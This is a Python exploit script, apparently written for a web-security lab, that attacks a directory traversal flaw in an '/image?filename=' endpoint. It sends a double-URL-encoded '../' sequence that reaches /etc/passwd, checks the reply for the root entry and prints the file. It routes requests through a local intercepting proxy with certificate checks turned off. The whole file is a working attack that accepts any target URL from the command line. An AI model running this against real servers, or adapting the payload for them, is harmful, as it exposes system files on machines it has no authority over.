import sys, requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}

def dir_traversal_exploit(url):
    img_url = url + "/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"
    r = requests.get(img_url, verify=False ,proxies=proxies)
    if "root:x:0:0:root:" in r.text:
        print("Exploit successfull !!\n")
        print("Expolit: [/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34]\n")
        print("Content of /etc/passwd:\n")
        print(r.text)
    else:
        print("Exploit faild.")
        sys.exit(-1)
        
def main():
    if len(sys.argv) != 2 :
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Exploiting the directory traversal vulnerability ...\n")
    dir_traversal_exploit(url)

if __name__ == "__main__" :
    main()
    